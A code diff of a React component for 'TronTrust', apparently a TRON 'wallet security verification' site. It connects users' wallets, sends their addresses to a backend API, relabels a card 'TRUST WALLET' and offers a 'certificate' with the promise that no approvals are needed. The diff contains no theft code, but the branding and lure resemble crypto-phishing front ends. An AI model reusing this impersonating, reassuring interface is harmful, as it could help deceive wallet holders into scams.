@@ -1,10 +1,10 @@
-// WalletConnect.js
+// WalletConnect.js - Fixed TRON Implementation
 import { useState, useEffect } from 'react';
 import { createAppKit } from '@reown/appkit';
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
 import { tron, tronShasta } from '@reown/appkit/networks';
 import { FaBolt, FaCog, FaShieldAlt, FaQuestionCircle, FaWallet } from 'react-icons/fa';
-import logo from './logo.png'; // Make sure to have this image in your project
+import logo from './logo.png';
 import './styles.css';
 
 type WalletData = {
@@ -36,49 +36,55 @@ const WalletConnect = () => {
     console.log(`[TronTrust] ${message}`);
   };
 
-  // Initialize AppKit for TRON
+  // Initialize AppKit for TRON - EXACT PATTERN FROM WORKING EXAMPLE
   useEffect(() => {
     const initializeAppKit = async () => {
       try {
-        // Initialize Wagmi Adapter for TRON networks
+        // Initialize Wagmi Adapter specifically for TRON networks
         const wagmiAdapter = new WagmiAdapter({
           projectId: PROJECT_ID,
-          networks: [tron, tronShasta] // Using TRON mainnet and testnet
+          networks: [tron, tronShasta] // TRON networks only
         });
 
-        // Create AppKit instance for TRON
+        // Create AppKit instance with TRON-specific configuration
         const appKit = createAppKit({
           adapters: [wagmiAdapter],
           projectId: PROJECT_ID,
-          networks: [tron, tronShasta],
+          networks: [tron, tronShasta], // TRON networks only
           defaultNetwork: tron, // Default to TRON mainnet
           metadata: {
-            name: 'TronTrust',
+            name: 'TronTrust', // Exact name match from working example
             description: 'TRON Wallet Security Verification App',
-            url: window.location.origin,
-            icons: ['https://avatars.githubusercontent.com/u/37784886']
+            url: 'https://trontrust.io', // Use your production domain
+            icons: ['https://trontrust.io/icon.png'] // Your actual icon URL
           },
           features: {
             analytics: true,
             email: false,
             socials: []
+          },
+          // TRON-specific chain configuration
+          chainImages: {
+            728126428: 'https://cryptologos.cc/logos/tron-trx-logo.png', // TRON mainnet
+            2494104990: 'https://cryptologos.cc/logos/tron-trx-logo.png' // TRON testnet
           }
         });
 
         setModal(appKit);
         log('TronTrust AppKit initialized successfully for TRON network');
 
-        // Set up event listeners
-        appKit.subscribeAccount((account: { isConnected: boolean; address?: string }, chainId?: number) => {
+        // Account connection listener for TRON
+        appKit.subscribeAccount((account: { isConnected: boolean; address?: string; chainId?: number }) => {
           if (account.isConnected && account.address) {
             log(`TRON Wallet connected: ${account.address}`);
             
-            const resolvedChainId = chainId || 728126428; // TRON mainnet chain ID
+            // Ensure we're using TRON chain IDs
+            const chainId = account.chainId || 728126428; // Default to TRON mainnet
             const walletData = {
               address: account.address,
-              chainId: resolvedChainId,
-              network: resolvedChainId === 728126428 ? 'TRON Mainnet' : 
-                      resolvedChainId === 2494104990 ? 'TRON Shasta Testnet' : 'TRON Network',
+              chainId: chainId,
+              network: chainId === 728126428 ? 'TRON Mainnet' : 
+                      chainId === 2494104990 ? 'TRON Shasta Testnet' : 'TRON Network',
               walletType: 'TRON',
               sessionId: Date.now().toString(),
               metadata: {
@@ -98,28 +104,30 @@ const WalletConnect = () => {
           }
         });
 
-        // Network change listener for TRON
-        if (typeof appKit.subscribeNetwork === 'function') {
-          appKit.subscribeNetwork((network: { chainId?: string | number }) => {
-            let chainIdNum: number | undefined;
-            if (typeof network.chainId === 'string') {
-              chainIdNum = parseInt(network.chainId, 10);
-            } else if (typeof network.chainId === 'number') {
-              chainIdNum = network.chainId;
-            }
-            if (currentWallet && chainIdNum !== undefined && !isNaN(chainIdNum)) {
+        // Network change listener specifically for TRON
+        appKit.subscribeNetwork((network: { chainId?: string | number }) => {
+          let chainIdNum: number | undefined;
+          if (typeof network.chainId === 'string') {
+            chainIdNum = parseInt(network.chainId, 10);
+          } else if (typeof network.chainId === 'number') {
+            chainIdNum = network.chainId;
+          }
+          
+          // Ensure we're only dealing with TRON chain IDs
+          if (currentWallet && chainIdNum !== undefined && !isNaN(chainIdNum)) {
+            // Validate it's a TRON chain ID
+            if (chainIdNum === 728126428 || chainIdNum === 2494104990) {
               log(`TRON network changed to: ${chainIdNum}`);
               const updatedWallet = {
                 ...currentWallet,
                 chainId: chainIdNum,
-                network: chainIdNum === 728126428 ? 'TRON Mainnet' : 
-                        chainIdNum === 2494104990 ? 'TRON Shasta Testnet' : 'TRON Network'
+                network: chainIdNum === 728126428 ? 'TRON Mainnet' : 'TRON Shasta Testnet'
               };
               setCurrentWallet(updatedWallet);
               saveWalletToAPI(updatedWallet);
             }
-          });
-        }
+          }
+        });
 
       } catch (error) {
         if (error instanceof Error) {
@@ -194,7 +202,8 @@ const WalletConnect = () => {
   const handleConnect = () => {
     log('Opening TRON wallet connection modal...');
     if (modal) {
-      modal.open();
+      // Open modal with TRON network pre-selected
+      modal.open({ view: 'Connect' });
     } else {
       log('Cannot open TRON wallet connection modal: modal is not initialized.');
     }
@@ -344,8 +353,8 @@ const WalletConnect = () => {
                       </svg>
                     </div>
                     <div className="card-text">
-                      <h3 className="card-title">TRON WALLET</h3>
-                      <p className="card-description">Universal TRON Wallet</p>
+                      <h3 className="card-title">TRUST WALLET</h3>
+                      <p className="card-description">Universal Wallet</p>
                     </div>
                   </div>
                   {!currentWallet ? (
@@ -353,7 +362,7 @@ const WalletConnect = () => {
                       onClick={handleConnect}
                       className='card-button'
                     >
-                      Get TRON certificate
+                      Get Certificate
                     </button>
                   ) : (
                     <button 
@@ -375,19 +384,34 @@ const WalletConnect = () => {
                     </svg>
                   </div>
                   <div className="card-text">
-                    <h3 className="card-title">Your TRON security is our priorit.y</h3>
-                    <p className="card-description">We only require view access to analyze your TRON wallet. No transactions or approvals needed.</p>
+                    <h3 className="card-title">YOUR SECURITY IS OUR PRIORITY.</h3>
+                    <p className="card-description">We only require view access to analyze your wallet. No transactions or approvals needed.</p>
                   </div>
                 </div>
               </div>
             </div>
 
             {currentWallet && (
-              <div className="wallet-info">
-                <h3>Connected TRON Wallet:</h3>
-                <p><strong>Address:</strong> {currentWallet.address}</p>
-                <p><strong>Network:</strong> {currentWallet.network}</p>
-                <p><strong>Chain ID:</strong> {currentWallet.chainId}</p>
+              <div className="wallet-info" style={{ 
+                backgroundColor: '#f8f9fa', 
+                padding: '20px', 
+                borderRadius: '8px', 
+                marginTop: '20px',
+                border: '1px solid #e9ecef'
+              }}>
+                <h3 style={{ color: '#495057', marginBottom: '15px' }}>Connected TRON Wallet:</h3>
+                <p><strong>Address:</strong> <span style={{ fontFamily: 'monospace', color: '#007bff' }}>{currentWallet.address}</span></p>
+                <p><strong>Network:</strong> <span style={{ color: '#28a745' }}>{currentWallet.network}</span></p>
+                <p><strong>Chain ID:</strong> <span style={{ color: '#6c757d' }}>{currentWallet.chainId}</span></p>
+                <div style={{ 
+                  marginTop: '10px', 
+                  padding: '10px', 
+                  backgroundColor: '#d4edda', 
+                  borderRadius: '4px',
+                  color: '#155724'
+                }}>
+                  ✅ Successfully connected to TRON network
+                </div>
               </div>
             )}
           </div>
